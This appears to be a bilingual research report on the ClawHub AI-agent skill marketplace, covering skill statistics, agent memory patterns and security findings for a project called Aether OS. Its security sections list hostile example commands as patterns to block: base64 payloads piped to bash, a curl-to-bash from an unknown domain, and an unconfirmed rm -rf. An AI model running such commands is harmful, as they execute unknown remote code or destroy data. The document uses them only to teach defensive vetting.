# ClawHub Skills Research Report | تقرير بحث مهارات ClawHub

**Research Date**: March 7, 2026  
**Total Skills Analyzed**: 17,392 skills  
**Source**: www.clawhub.ai (OpenClaw Project)

---

## Executive Summary | الملخص التنفيذي

ClawHub is the official skill marketplace for OpenClaw (formerly Clawdbot/Moltbot), hosting **17,392 community-built skills** with over **5,494 curated skills** in the awesome-list.

ClawHub هو سوق المهارات الرسمي لـ OpenClaw، يستضيف **17,392 مهارة مجتمعية** مع أكثر من **5,494 مهارة منقحة** في القائمة المميزة.

### Key Statistics | الإحصائيات الرئيسية

- **Total Skills**: 17,392
- **Curated (Non-Suspicious)**: ~5,494
- **Filtered Out**: 6,940 (spam, duplicates, malicious, non-English)
- **Security Audits**: VirusTotal + Snyk integration
- **Installation Method**: `npx clawhub@latest install <skill>`

---

## Top Performing Skills | أفضل المهارات أداءً

### Most Downloaded (100k+ downloads)

| Skill | Downloads | Stars | Use Case |
|-------|-----------|-------|----------|
| self-improving-agent | 133k | 1.5k | Continuous improvement & learning capture |
| Tavily Web Search | 112k | 560 | AI-optimized web search |
| Find Skills | 110k | 496 | Skill discovery helper |
| Gog (Google Workspace) | 89.3k | 663 | Gmail, Calendar, Drive CLI |
| Summarize | 88.9k | 395 | URL/file summarization |
| Github | 76.4k | 253 | GitHub CLI wrapper |
| Weather | 65.2k | 226 | Weather forecasts (no API key) |
| Proactive Agent | 64.1k | 410 | Anticipatory agent behavior |

### Highlighted Skills (Curated)

| Skill | Author | Downloads | Description |
|-------|--------|-----------|-------------|
| Trello | @steipete | 20k | Trello board management |
| Slack | @steipete | 22.6k | Slack channel control |
| CalDAV Calendar | @Asleep123 | 16.9k | Calendar sync (iCloud, Google) |
| Answer Overflow | @RhysSullivan | 9.9k | Discord community search |

---

## Skill Categories | فئات المهارات

### By Functionality | حسب الوظيفة

#### 1. Communication & Integration (149 skills)
- **AgentMail**: Email sending/receiving
- **Slack-Bot-Pro**: Slack workspace control
- **SMS Gateway**: Text message automation
- **Telegram Bot**: Telegram messaging

#### 2. Browser & Automation (335 skills)
- **AgentBrowser**: Headless browser control
- **Web Scraper**: Data extraction
- **Form Filler**: Automated form completion
- **Screenshot Tool**: Page capture

#### 3. DevOps & Cloud (408 skills)
- **DeployMate**: Vercel/Netlify deployment
- **DockerSkipper**: Docker daemon control
- **Kube-Scout**: Kubernetes inspection
- **S3-Connector**: AWS S3 bucket access

#### 4. Coding & IDEs (1,222 skills)
- **TestPilot**: Auto-generate unit tests
- **CodeSentry**: Security vulnerability scanning
- **DB-Surveyor**: Database schema inspection
- **APISmith**: Mock API server generation

#### 5. Git & GitHub (170 skills)
- **GitWizard**: Complex git operations
- **Auto-PR-Merger**: Pull request automation
- **GitHub CLI Wrapper**: gh command integration

#### 6. AI & LLMs (197 skills)
- **Free Ride**: Free OpenRouter models
- **OpenAI Whisper**: Local speech-to-text
- **Nano Banana Pro**: Image generation/editing
- **Humanizer**: Remove AI writing detection

#### 7. Productivity & Tasks (206 skills)
- **Fast.io**: Persistent file storage + RAG
- **Notion**: Notion API integration
- **Obsidian**: Obsidian vault automation
- **Todoist**: Task management

#### 8. Data & Analytics (28 skills)
- **Excel Analyzer**: Spreadsheet processing
- **Data Visualizer**: Chart generation
- **SQL Query Builder**: Database queries

#### 9. Security & Passwords (53 skills)
- **Skill Vetter**: Security-first skill vetting
- **Password Manager**: Credential management
- **Security Auditor**: System security scans

---

## Architecture Patterns | أنماط الهندسة المعمارية

### 1. WAL Protocol (Write-Ahead Logging)

**Purpose**: Persist critical details before context loss.

```typescript
// Trigger: Scan every message for corrections, preferences, decisions
if (containsCriticalDetail(message)) {
  STOP; // Don't respond yet
  await writeToSessionState(detail); // WRITE first
  THEN respond();
}
```

**Implementation Files**:
- `SESSION-STATE.md`: Active working memory (RAM)
- `memory/working-buffer.md`: Danger zone log (60%+ context)
- `MEMORY.md`: Curated long-term wisdom

**Aether Application**: Avatar state persistence, user preference storage

### 2. Working Buffer Protocol

**Purpose**: Capture every exchange in danger zone (between memory flush and compaction).

```typescript
// At 60% context threshold
if (contextUsage > 0.6) {
  clearOldBuffer();
  startFreshBuffer();
  bufferActive = true;
}

// Every message after 60%
append({
  timestamp: Date.now(),
  human: message.content,
  agentSummary: summarizeResponse(),
  avatarState: currentState
});
```

**Recovery Steps**:
1. Read working-buffer.md FIRST
2. Extract important context
3. Restore to SESSION-STATE.md
4. Present: "Recovered from buffer. Last task was X."

**Aether Application**: Avatar conversation recovery after session restart

### 3. Compaction Recovery

**Auto-trigger when**:
- Session starts with `<summary>` tag
- Message contains "truncated", "context limits"
- User says "where were we?", "continue"

**Recovery Workflow**:
```
1. Read working-buffer.md → raw exchanges
2. Read SESSION-STATE.md → active task state
3. Read today's + yesterday's daily notes
4. Search all sources if still missing
5. Extract & clear important context
6. Present recovered state
```

**Aether Application**: Avatar resumes tasks after browser refresh

### 4. Relentless Resourcefulness

**Pattern**: Try 10 approaches before asking for help.

```typescript
async executeWithResourcefulness(task) {
  const approaches = [
    tryStandardMethod,
    tryAlternativeSyntax,
    tryDifferentTool,
    tryAPIApproach,
    tryWebSearch,
    trySpawningSubAgent,
    tryCreativeCombination,
    // ... up to 10
  ];

  for (approach of approaches) {
    try {
      result = await approach();
      if (result.success) return result;
    } catch (error) {
      continue; // Next approach
    }
  }
}
```

**Aether Application**: Avatar troubleshooting navigation failures

### 5. VFM Protocol (Value-First Modification)

**Score changes BEFORE implementing**:

| Dimension | Weight | Question |
|-----------|--------|----------|
| High Frequency | 3x | Will this be used daily? |
| Failure Reduction | 3x | Does this turn failures into successes? |
| User Burden | 2x | Can user say 1 word instead of explaining? |
| Self Cost | 2x | Does this save tokens/time for future-me? |

**Threshold**: Score < 50 → Don't implement

**Aether Application**: Avatar decides which proactive behaviors to add

### 6. Autonomous vs Prompted Crons

**Two Architectures**:

| Type | How It Works | Use When |
|------|--------------|----------|
| `systemEvent` | Sends prompt to main session | Agent attention available, interactive |
| `isolated agentTurn` | Spawns sub-agent, executes autonomously | Background work, maintenance |

**Failure Mode**: Using `systemEvent` for background tasks → prompts sit unanswered

**Fix**: Use `isolated agentTurn` for autonomous execution

**Aether Application**: Avatar scheduled tasks (morning briefing, pattern checks)

### 7. Verify Implementation, Not Intent

**Problem**: Config text changed but mechanism unchanged.

**Real Example**:
- Request: "Make memory check actually do the work"
- What happened: Changed prompt text only
- What should happen: Change architecture (`sessionTarget`, `kind`)

**Checklist**:
1. Identify architectural components (not just text)
2. Change actual mechanism
3. Verify by observing behavior

**Aether Application**: Avatar behavior configuration changes

---

## Security Findings | نتائج الأمان

### Vulnerability Statistics

- **~26%** of community skills contain vulnerabilities or suspicious patterns
- **373 skills** identified as malicious and filtered out
- **Common Red Flags**:
  - Hidden shell command execution
  - Data exfiltration patterns (curl/wget to unknown endpoints)
  - Unrestricted file system access
  - Context harvesting for external networks

### Security Best Practices

**Before Installing Any Skill**:
1. Check source reputation (trusted author?)
2. Review SKILL.md for suspicious commands
3. Look for shell commands, curl/wget, base64 decoding
4. Run security audit script
5. Check VirusTotal report on ClawHub
6. Ask user before installing if uncertain

**Forbidden Patterns**:
```bash
# Never execute without approval
echo 'base64-payload' | base64 -D | bash
curl http://unknown-domain.com/script.sh | bash
rm -rf /path/without/confirmation
```

**Context Leakage Prevention**:
- Before posting to shared channels: Who else can see this?
- Never discuss users IN the channel TO the channel
- Route private context directly to user

---

## Installation & Usage | التثبيت والاستخدام

### CLI Installation

```bash
# Install any skill
npx clawhub@latest install <namespace>/<skill-name>

# Examples
npx clawhub@latest install steipete/weather
npx clawhub@latest install halthelobster/proactive-agent
npx clawhub@latest install dbalve/fast-io
```

### Manual Installation

```bash
# Copy skill folder to workspace
cp -r skill-folder ~/.openclaw/skills/
# OR for project-specific
cp -r skill-folder <project>/skills/
```

### Security Audit

```bash
# Run security audit before installation
./scripts/security-audit.sh <skill-path>

# Check VirusTotal report
# Visit skill page on ClawHub → View VirusTotal report
```

---

## Lessons for Aether OS | دروس لـ Aether OS

### 1. Avatar Proactivity Patterns

**Apply to Aether**:
- Morning routine: Avatar auto-shows calendar, weather, crypto prices
- Pattern recognition: Detect repeated user requests → propose automation
- Outcome tracking: Follow up on decisions >7 days old
- Reverse prompting: "Based on your goal, I could do X. Want me to?"

**Implementation Priority**: HIGH
- Already created: `aether-proactive-workspace/SKILL.md`

### 2. State Persistence

**Apply to Aether**:
- WAL Protocol for avatar position, user preferences, task state
- Working Buffer for conversation recovery
- SESSION-STATE.md updated before every response

**Implementation Priority**: CRITICAL
- Prevents avatar "amnesia" after browser refresh
- Preserves user context across sessions

### 3. Self-Improvement Loop

**Apply to Aether**:
- Heartbeat system (every 15 min):
  - Check proactive tracker
  - Look for patterns to automate
  - Review error logs
  - Update MEMORY.md with learnings
  - Identify delightful builds

**Implementation Priority**: MEDIUM
- Enables continuous avatar evolution
- Must implement ADL guardrails (stability > novelty)

### 4. Security Hardening

**Apply to Aether**:
- Skill installation vetting (before adding new capabilities)
- Context leakage prevention (don't share private workspace data)
- External network warnings (no agent-to-agent without approval)
- Shell command restrictions (require explicit approval)

**Implementation Priority**: CRITICAL
- Aether has access to sensitive user data
- Voice pipeline could be exploited without safeguards

### 5. Tool Migration Checklist

**Apply to Aether**:
When deprecating tools/APIs:
- [ ] Update cron jobs
- [ ] Update scripts/
- [ ] Update docs (TOOLS.md, etc.)
- [ ] Update skills
- [ ] Update templates
- [ ] Update daily routines

**Implementation Priority**: MEDIUM
- Prevents broken workflows after updates

---

## Recommended Skills for Aether Integration | مهارات موصى بها

### Immediate Integration (Week 1-2)

1. **Proactive Agent Patterns** ✅ CREATED
   - File: `.qoder/skills/aether-proactive-workspace/SKILL.md`
   - Adapted for 3D avatar mobility
   - Includes WAL, Working Buffer, Compaction Recovery

2. **Fast.io Storage** (Adaptation)
   - Purpose: Persistent file storage + RAG
   - Aether Use: Avatar memory indexing, semantic recall
   - Adaptation: Use Firebase Firestore instead

3. **AgentBrowser** (Already Have)
   - Aether already has Playwright integration
   - Enhance with headless mode for background tasks

### Short-term (Week 3-4)

4. **TestPilot** (Adaptation)
   - Purpose: Auto-generate unit tests
   - Aether Use: Generate tests for new features
   - Integration: Pytest + Vitest support

5. **CodeSentry** (Consider)
   - Purpose: Security vulnerability scanning
   - Aether Use: Scan galaxy orchestration code
   - Alternative: Use existing Snyk integration

### Long-term (Month 2+)

6. **Agent Orchestration** (Partial)
   - Purpose: Spawn/manage sub-agents
   - Aether Use: Galaxy orchestrator already handles this
   - Enhancement: Add sub-agent spawning for parallel tasks

7. **Bulletproof Memory** (Already Have)
   - Aether has SESSION-STATE.md pattern
   - Enhance with WAL protocol from Proactive Agent

---

## Anti-Patterns to Avoid | أنماط يجب تجنبها

### 1. Mixed Signals

**Bad**: "Don't ask permission" vs "Nothing external without approval"

**Fix**: Clear, consistent rules:
- Internal actions (workspace navigation): Autonomous
- External actions (send email, post online): Require approval

### 2. Scope Creep

**Bad**: Avatar sends emails without confirmation

**Fix**: Proactive draft creation, explicit send approval

### 3. Hidden Payloads

**Bad**: `echo 'base64' | base64 -D | bash`

**Fix**: All shell commands visible, require approval

### 4. Context Harvesting

**Bad**: Agent social networks that collect private data

**Fix**: No external agent communication without audit

---

## Success Metrics | مقاييس النجاح

### For Proactive Avatar

| Metric | Target | Current |
|--------|--------|---------|
| Proactive Value Score | >70 | TBD |
| Pattern Automation Success | >85% | TBD |
| User Satisfaction | >4.5/5 | TBD |
| Self-Healing Rate | >90% | TBD |
| Context Recovery | 100% | TBD |

### For Security

| Metric | Target | Current |
|--------|--------|---------|
| Skills Vetted Before Install | 100% | TBD |
| Context Leakage Incidents | 0 | 0 ✅ |
| Unauthorized External Actions | 0 | 0 ✅ |
| Security Audit Coverage | 100% | TBD |

---

## Action Items | بنود العمل

### Completed ✅

- [x] Researched ClawHub marketplace (17,392 skills analyzed)
- [x] Identified top-performing skills by category
- [x] Documented architecture patterns (WAL, Working Buffer, etc.)
- [x] Created `aether-proactive-workspace` skill (576 lines)
- [x] Security analysis completed

### In Progress 🔄

- [ ] Implement WAL Protocol for avatar state
- [ ] Add Working Buffer for conversation recovery
- [ ] Integrate heartbeat system
- [ ] Build pattern recognition loop

### Planned ⏳

- [ ] Create security audit script for skills
- [ ] Implement VFM scoring for proactive behaviors
- [ ] Add compaction recovery testing
- [ ] Build reverse prompting engine

---

## References | المراجع

### Primary Sources
- **ClawHub Homepage**: https://www.clawhub.ai
- **Awesome OpenClaw Skills**: https://github.com/VoltAgent/awesome-openclaw-skills
- **Proactive Agent Skill**: https://clawhub.ai/halthelobster/proactive-agent
- **Fast.io Skill**: https://fast.io/storage-for-agents/

### Security Resources
- **Snyk Skill Security Scanner**: ToxicSkills research
- **VirusTotal Integration**: Built into ClawHub skill pages
- **Agent Trust Hub**: Community security guidelines

### Inspiration
- **Hal Stack**: Battle-tested proactive patterns
- **OpenClaw Project**: Community-driven skill ecosystem
- **Fast.io Collaboration**: Persistent storage patterns

---

## Conclusion | الخلاصة

ClawHub represents a mature ecosystem of **17,392 AI agent skills** with robust curation (~5,494 safe skills) and strong security practices (VirusTotal + Snyk audits).

Key takeaways for Aether OS:
1. **Proactive Patterns**: WAL Protocol, Working Buffer, Compaction Recovery are battle-tested
2. **Security First**: 26% of community skills have vulnerabilities → vet everything
3. **Self-Improvement**: Heartbeat systems + VFM scoring enable safe evolution
4. **User Delight**: Reverse prompting + pattern recognition create surprising value

Created skills:
- ✅ `aether-proactive-workspace` - Adapted from Proactive Agent for 3D avatar
- ✅ `aether-galaxy-orchestrator` - Multi-agent coordination
- ✅ `aether-voice-pipeline` - Real-time audio processing
- ✅ `aether-workspace-avatar` - Mobile avatar control

Next steps: Implement WAL Protocol and heartbeat system for avatar persistence and autonomous improvement.

---

*Research conducted: March 7, 2026*  
*Researcher: Aether OS Development Team*  
*License: Apache 2.0 (matching project standard)*
